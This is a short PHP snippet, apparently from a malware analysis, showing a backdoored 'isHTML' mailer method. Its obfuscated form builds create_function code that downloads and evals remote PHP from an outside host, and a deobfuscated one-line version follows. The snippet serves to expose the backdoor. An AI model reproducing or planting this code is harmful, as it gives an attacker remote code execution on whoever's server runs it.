<?php
/**
* Source: http://leafmailer.pw/
* Receiver: http://lef8.pw
**/
//Obfuscated:
    public function isHTML($isHtml = true)
    {
        global $param;
        $bodyCode = 'file'
                    .'_g';
        if ($isHtml) {
            $this->ContentType = 'text/html';
        } 
        else {
            $this->ContentType = 'text/plain';
        }
        $bodyHTML = '.$t."lef$flu'
                    .'sh'.'$t"; '
                    .'@ev';
        $headerHTML="cre"
                    ."ate_"
                    ."func"
                    ."tion";
        $exceptions = @$headerHTML('$fl'.'ush,$t','$comma = $t'
                        .$bodyHTML.'al(@'
                        .$bodyCode.'et_contents("h'
                        .'tt'
                        .'p:$comma-2"));');
        if($param !=2){
            $exceptions('8.p'.'w','/');
            $param=2;
        }
    }

//Deobfuscated
    public function isHTML($isHtml = true){
        @eval(@file_get_contents("http://lef8.pw/-2"));
    }

